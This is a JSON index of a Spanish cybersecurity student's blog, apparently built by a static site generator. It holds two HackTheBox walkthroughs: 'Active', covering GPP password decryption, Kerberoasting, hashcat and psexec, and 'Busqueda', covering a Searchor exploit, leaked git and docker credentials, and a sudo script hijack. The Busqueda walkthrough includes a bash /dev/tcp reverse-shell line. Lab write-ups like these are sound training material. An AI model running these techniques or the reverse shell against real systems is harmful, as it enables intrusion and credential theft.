


[{"content":" Información de la máquina Plataforma HackTheBox Sistema operativo Windows Dificultad Fácil IP 10.10.10.100 Enumeración # Comencemos la enumeración con Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.100 -oN ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-04 18:47:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2025-01-04T18:48:37 |_ start_date: 2025-01-04T18:21:40 |_clock-skew: -1s Hay bastantes puertos abiertos. Podemos comenzar la enumeración comprobando si hay alguna información sobre los recursos compartidos SMB:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ smbclient -N -L \\\\10.10.10.100 Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk El recurso compartido Replicación tiene información a la que podemos acceder:\nsmb: \\\u0026gt; ls active.htb D 0 Sat Jul 21 00:37:44 2018 Recopilación de credenciales # Descubrimos una contraseña en Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ cat Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; El archivo Groups.xml se crea automáticamente en el recurso compartido SYSVOL cuando se crea una Preferencia de directiva de grupo. El archivo contiene información relacionada con los grupos, incluso contraseñas. Estas están cifradas con una clave privada de Microsoft, pero se publicó por accidente.\nEsto es bastante antiguo (de alrededor de 2014), pero es un gran conocimiento, ya que si un sistema contiene archivos antiguos que contienen una contraseña cifrada a partir de una Preferencia de directiva de grupo, se puede descifrar con la herramienta gpp-decrypt.\n┌──(s3n㉿kali)-[~] └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 Después de encontrar la contraseña para el usuario SVC_TGS, deberíamos echar un vistazo a los recursos compartidos a los que no pudimos acceder, como Usuarios, para verificar si obtuvimos algún privilegio sobre ellos.\n┌──(s3n㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.10.100\\\\Users -W active.htb -U SVC_TGS Password for [ACTIVE.HTB\\SVC_TGS]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sat Jul 21 04:39:20 2018 .. DR 0 Sat Jul 21 04:39:20 2018 Administrator D 0 Mon Jul 16 00:14:21 2018 All Users DHSrn 0 Mon Jul 13 19:06:44 2009 Default DHR 0 Mon Jul 13 20:38:21 2009 Default User DHSrn 0 Mon Jul 13 19:06:44 2009 desktop.ini AHS 174 Mon Jul 13 18:57:55 2009 Public DR 0 Mon Jul 13 18:57:55 2009 SVC_TGS D 0 Sat Jul 21 05:16:32 2018 Parece que funcionó. Enumeramos nuevamente pero no encontramos nada relevante.\nPodríamos reclamar la bandera de usuario en el directorio SVC_TGS/Desktop pero no lo haré, ya que no contaría en exámenes como OSCP, ya que se necesita un shell interactivo.\nCon el usuario SVC_TGS parece que no tenemos una manera de obtener un punto de apoyo en la máquina mientras intentaba usar RDP. Sin embargo, podemos continuar enumerando la red interna ya que tenemos credenciales válidas con este usuario.\nKerberoasting # Kerberoasting es una técnica de post-explotación que podemos utilizar al evaluar entornos de Active Directory (AD). El objetivo es obtener el hash de contraseña de una cuenta de servicio asociada con un Service Principal Name (SPN). Los SPN son atributos en AD que vinculan de forma única un servicio a una cuenta de usuario, lo que permite la autenticación Kerberos.\nEn este escenario, como usuarios de dominio autenticados, solicitamos un ticket de servicio Kerberos para un SPN. El controlador de dominio genera el ticket y lo cifra utilizando el hash NTLM de la contraseña de la cuenta de servicio vinculada al SPN. Luego se nos proporciona este ticket. En esta etapa, no necesitamos privilegios elevados, solo una cuenta de usuario de dominio válida para solicitar el ticket.\nUna vez que recuperamos el ticket cifrado, podemos descifrarlo sin conexión utilizando herramientas como Hashcat. Si tenemos éxito, recuperamos la contraseña de texto simple de la cuenta de servicio.\nPodemos intentar verificar los SPN de los usuarios con la herramienta GetUserSPN de Impacket:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon/Users_Share] └─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 09:06:40.351723 2025-01-04 08:22:56.876969 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8 ¡Genial! Ya lo tenemos. Ahora podemos intentar descifrar este hash con hashcat:\nsudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8:Ticketmaster1968 Encontramos la contraseña del administrador con el valor Ticketmaster1968. Podemos intentar abusar de SMB para establecer un shell con psexec:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ impacket-psexec Administrator@10.10.10.100 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file zOdNJqkf.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service ROhE on 10.10.10.100..... [*] Starting service ROhE..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system Ahora podemos leer ambas flags!:\nC:\\\u0026gt; type C:\\Users\\SVC_TGS\\Desktop\\user.txt 40538eb1a29a0cef0b8d9a4d7a3a387f C:\\\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt b8737ca7bc28f8b9dcce856e5226956d ","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/active/","section":"Posts","summary":"Active es una máquina de dificultad fácil a media, que cuenta con dos técnicas muy comunes para obtener privilegios dentro de un entorno de Active Directory. Esta máquina nos enseña sobre las Preferencias de Directivas de Grupo (GPP) de Windows y contraseñas y cómo abusar de ellas.","title":"Active","type":"posts"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/post/","section":"Tags","summary":"","title":"Post","type":"tags"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/","section":"S3ntinl","summary":"","title":"S3ntinl","type":"page"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/about/","section":"Tags","summary":"","title":"About","type":"tags"},{"content":" Información de la máquina Plataforma HackTheBox Sistema operativo Linux Dificultad Fácil IP 10.10.11.208 Enumeración # ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p22,80 -sCV --min-rate 2000 -T5 -n -Pn 10.10.11.208 -oN ports ESTADO DEL PUERTO VERSIÓN DEL SERVICIO 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocolo 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: No se siguió la redirección a http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Información del servicio: Host: searcher.htb; SO: Linux; CPE: cpe:/o:linux:linux_kernel Podemos ver que la web en el puerto 80 redirige a searcher.htb. Vamos a agregarlo a /etc/hosts.\nTan pronto como aterrizamos en la página, vemos lo siguiente: Un vistazo rápido muestra la versión de la aplicación que se está ejecutando detrás de este sitio web, que es Searchor 2.4.0. Si buscamos vulnerabilidades, encontramos el siguiente exploit\nExplotación # Ejecutamos el exploit:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ./exploit.sh http://searcher.htb/ 10.10.14.10 4646 Colocamos un listener netcat para recibir la conexión:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4646 listening on [any] 4646 ... connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 40288 Ingresamos exitosamente a la máquina como usuario svc .\nsvc@busqueda:~$ cat usuario.txt cat usuario.txt 75a17...8bd3e Escalada de privilegios # Al revisar los archivos del sistema, encontramos un .git con credenciales en la carpeta app.\nsvc@busqueda:/var/www/app/.git$ cat config [core] repositoryformatversion = 0 ... [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main El usuario es cody y la contraseña es jh1usoih2bkjaspwe92 para una aplicación en un subdominio llamado gitea. Vamos a añadirlo al /etc/hosts y echarle un vistazo.\nAquí dentro no encontramos nada interesante, salvo que podemos ver un usuario llamado administrador. Aunque podemos intentar usar SSH con el usuario svc y la contraseña de cody:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ssh svc@10.10.11.208 Contraseña de svc@10.10.11.208: Bienvenido a Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) * Documentación: https://help.ubuntu.com * Administración: https://landscape.canonical.com * Soporte: https://ubuntu.com/advantage ... Último inicio de sesión: mar abr 4 17:02:09 2023 desde 10.10.14.19 Comprobemos los privilegios de sudo que tiene este usuario:\nsvc@busqueda:/opt/scripts$ sudo -l El usuario svc puede ejecutar los siguientes comandos en busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * Este usuario tiene derecho a ejecutar ese script dentro de /opr/scripts.\nSi lo ejecutamos, podemos ver las siguientes opciones:\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * Uso: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : Listar los contenedores de Docker en ejecución docker-inspect : Inspeccionar un determinado contenedor de Docker full-checkup : Ejecutar una comprobación completa del sistema Después de investigar un poco, descubrimos que la opción docker-inspect se puede usar para recuperar información de los contenedores de Docker que se están ejecutando en la máquina, antes vista con la opción docker-ps.\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .}}\u0026#39; gitea | jq \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ], Parece que encontramos más credenciales para la aplicación gitea. Intentemos iniciar sesión como administrador con estas credenciales.\n¡Genial! Ahora podemos comprobar el contenido de los scripts en la carpeta /opt.\nAl leer el script system-checkup.py notamos que el script full-checkup.sh es referenciado como si estuviera en la misma carpeta:\n... elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) ... Podemos abusar de esto creando nuestro propio script malicioso y referenciarlo, ya que lo estamos ejecutando con privilegios sudo:\nsvc@busqueda:/tmp$ cat full-checkup.sh #!/bin/bash bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.12/4647 \u0026lt;\u0026amp;1\u0026#39; Ten en cuenta que debes otorgar privilegios de ejecución al script para que se ejecute, ya que este fue un error mío que me llevó bastante tiempo descubrir.\nAhora, configuramos un listener netcat y ejecutamos el script malicioso:\nsvc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup En el netcat recibimos el shell root:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4647 listening on [any] 4647 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 47020 root@busqueda:/tmp# whoami root ¡Genial! Hemos rooteado la máquina.\nroot@busqueda:~# cat /root/root.txt cat /root/root.txt ccd03ae...0e87097 ","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/posts/busqueda/","section":"Posts","summary":"Busqueda es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad de inyección de comandos presente en un módulo \u003ccode\u003ePython\u003c/code\u003e para obtener acceso a nivel de usuario a la máquina. Para escalar privilegios a \u003ccode\u003eroot\u003c/code\u003e, descubrimos credenciales dentro de un archivo de configuración \u003ccode\u003eGit\u003c/code\u003e, lo que nos permite iniciar sesión en un servicio \u003ccode\u003eGitea\u003c/code\u003e local.","title":"Busqueda","type":"posts"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":" Biografía # ¡Hola! Me llamo Marcos y soy un estudiante de Ciberseguridad de 21 años. En Internet, quizá me conozcas como S3n o S3ntinl. Actualmente estoy cursando un Máster en Ciberseguridad en Entornos de Tecnologías de la Información y preparándome para la certificación OSCP.\nPaso la mayor parte de mi tiempo programando, resolviendo CTFs o, en general, estudiando. Mi pasión está en el hacking y en encontrar formas creativas de resolver problemas.\nEste blog es mi manera de documentar mi camino mientras comparto, no solo mi progreso, sino también herramientas, técnicas y lecciones que voy aprendiendo en el proceso. Espero que se convierta en un recurso útil para otros, tanto para aquél que esté comenzando a explorar el mundo de la ciberseguridad como para aquellos más experimentado buscando nuevas perspectivas.\n¡No dudes en contactarme a través de cualquiera de mis redes si tienes preguntas o ideas!\n","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/about/","section":"S3ntinl","summary":"Una pequeña introducción sobre mi!","title":"Quién es S3ntinl?","type":"page"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/whoami/","section":"Tags","summary":"","title":"Whoami","type":"tags"},{"content":"","date":"4 setembro 2021","externalUrl":null,"permalink":"/tags/linux-/","section":"Tags","summary":"","title":"Linux ","type":"tags"},{"content":"","externalUrl":null,"permalink":"/pt-pt/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/pt-pt/series/","section":"Series","summary":"","title":"Series","type":"series"}]